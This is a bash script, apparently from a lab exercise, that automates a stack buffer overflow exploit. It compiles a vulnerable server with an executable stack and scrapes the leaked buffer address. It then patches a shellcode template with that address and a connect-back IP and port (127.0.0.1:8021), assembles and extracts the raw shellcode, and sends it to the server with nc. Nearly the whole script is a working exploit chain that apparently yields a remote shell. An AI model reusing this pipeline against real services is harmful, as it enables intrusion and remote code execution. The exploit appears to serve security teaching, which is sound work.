#!/bin/bash

echo "Compiling dangerous"

gcc -z execstack -Wall -Wextra -O2 -std=c17 -o dangerous dangerous.c
if [ $? -ne 0 ]; then
    echo "Compilation failed"
    exit 1
fi

port=8020
echo "Starting server on port $port"

echo "Running dangerous"
./dangerous "$port" > dangerous.out 2> dangerous.err &
pid=$!

echo "Process ID: $pid"

echo "hi" | nc -q 0 localhost $port

kill $pid
echo "Process $pid killed"

echo "Getting buffer address"
# Adres bufora na stosie: %p\n
grep -oP 'Adres bufora na stosie: \K0x[0-9a-f]+' dangerous.out > buffer_address.txt
buffer_address=$(cat buffer_address.txt)
# Get only the first buffer address
buffer_address=$(head -n 1 buffer_address.txt)
echo "Buffer address: $buffer_address"

# Remove 0x from the beginning
buffer_address=${buffer_address#0x}
echo "Buffer address without 0x: $buffer_address"

template_file="shell_code_template.asm"
shell_code_file="shell_code.asm"

echo "Creating shell code file"
cp "$template_file" "$shell_code_file"

# Replace <buff>
echo "Replacing <buff> in shell code template with buffer address"
# Replace <buff> with buffer address and generate 6 dq lines with <buff> + 64
sed -i "s|<buff>|$buffer_address|g" "$shell_code_file"

ip="127,0,0,1"
server_port="8021"
server_port_hex=$(printf "%04x" $server_port)
printf "Server IP: %s\n" "$ip"
sed -i "s|<ip>|$ip|g" "$shell_code_file"
printf "Server port (hex): %s\n" "$server_port_hex"
sed -i "s|<port>|$server_port_hex|g" "$shell_code_file"

cat "$shell_code_file"

nasm -f elf64 -w+all -w+error -o shell_code.o shell_code.asm
if [ $? -ne 0 ]; then
    echo "Assembly failed"
    exit 1
fi

ld --fatal-warnings -o shell_code.elf shell_code.o
if [ $? -ne 0 ]; then
    echo "Linking failed"
    exit 1
fi

out=$(objdump -h shell_code.elf)
echo "Shell code sections:"
echo "$out"

fileOffset=$(echo "$out" | grep -oP '^\s*\d+\s+\.text\s+\K[0-9a-f]+')
echo "File offset: $fileOffset"

size=$(echo "$out" | grep -oP '^\s*\d+\s+\.text\s+\K[0-9a-f]+(?=\s+0x)')
echo "Size: $size"

dd if=shell_code.elf of=shell_code.bin bs=1 skip=$((0x$fileOffset)) count=$((0x$size))

echo "Shell code binary created: shell_code.bin"

echo "Sending shell code to server"
nc localhost $port < shell_code.bin